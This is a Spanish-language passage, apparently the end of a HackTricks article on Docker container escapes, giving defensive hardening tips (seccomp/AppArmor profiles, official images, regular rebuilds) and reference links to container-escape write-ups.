* Ajuste los perfiles de [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (o SELinux) para restringir las acciones y las llamadas al sistema disponibles para el contenedor al mínimo necesario.
* Use [imágenes oficiales de Docker](https://docs.docker.com/docker-hub/official_images/) o construya las suyas propias basadas en ellas. No herede ni use imágenes [con puertas traseras](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstruya regularmente sus imágenes para aplicar parches de seguridad. Esto va sin decir.

# Referencias

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿o quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
